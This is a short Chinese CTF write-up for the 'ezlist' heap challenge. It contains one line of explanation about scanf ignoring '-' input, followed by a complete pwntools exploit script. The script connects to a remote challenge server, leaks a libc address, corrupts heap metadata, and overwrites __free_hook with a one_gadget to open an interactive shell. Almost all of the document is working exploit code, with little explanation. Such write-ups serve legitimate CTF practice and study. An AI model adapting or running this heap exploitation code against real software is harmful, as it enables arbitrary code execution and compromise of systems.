这里首先搞清楚一个点 scanf 在读入整数时如果输入 ‘-’是不会改变原来地址的值的，知道这个这题会好做很多

其他利用细节太长不想写了（逃

感兴趣的同学可以私聊

exp

```python
# -*- encoding: utf-8 -*-
from pwn import * 
binary = './ezlist'
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.31.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = '101.34.30.75'
    port = '10001'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 10))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>>',num)

def add_list( nums):
    cmd(1)
    sla('counts' , len(nums))
    ru('nums')
    for i in nums:
        sl(str(i))

def add_node(idx , text):
    cmd(2)
    sla('index:' , idx)
    sla('num' , text)

def delete_node(idx , idx2):
    cmd(3)
    sla('index:' , idx)
    sla('data:' , idx2)

def attack():
    
    add_list([0]) #0
    add_list([0])
    add_list([0])
    add_list([0])
    add_list([-0x89 ])

    delete_node(4, 0) #删除counts，后面位置前移
    add_node(4, 0x441)

    delete_node(0, 1)
    add_list(['-']) #0
    add_list(['-']) #5

    delete_node(5, 1)
    delete_node(0, 1)
    rl()
    __malloc_hook = rint(15) - 0x470
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    pop_rdi_ret = libc.search(asm('pop rdi;ret')).next()
    lg('system_addr' , system_addr - libc.address)
    lg('__malloc_hook' , __malloc_hook)
    binsh_addr = libc.search('/bin/sh\x00').next()
    # one_gadget = 0xe6c81 + libc.address
    one_gadget = 0xe3b31 + libc.address

    add_node(4, __free_hook - 8)
    
    add_list(['-'])
    add_list([ one_gadget])

    delete_node(0, 1)


    p.interactive()

attack()

'''
@File    :   ezlist.py
@Time    :   2022/03/18 20:54:22
@Author  :   Niyah 
'''


```

